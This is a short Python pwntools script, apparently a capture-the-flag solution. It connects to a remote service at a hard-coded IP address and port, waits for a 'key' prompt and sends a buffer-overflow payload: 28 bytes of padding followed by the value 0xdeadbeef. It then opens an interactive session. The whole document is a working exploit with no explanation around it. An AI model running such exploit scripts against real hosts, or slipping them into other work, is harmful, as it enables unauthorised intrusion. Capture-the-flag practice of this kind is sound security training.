from pwn import *

#r = process('pass')
r = remote('140.110.112.77', 6125)
r.recvuntil('key')
r.sendline('a' * 28 + p64(0xdeadbeef))
r.interactive()
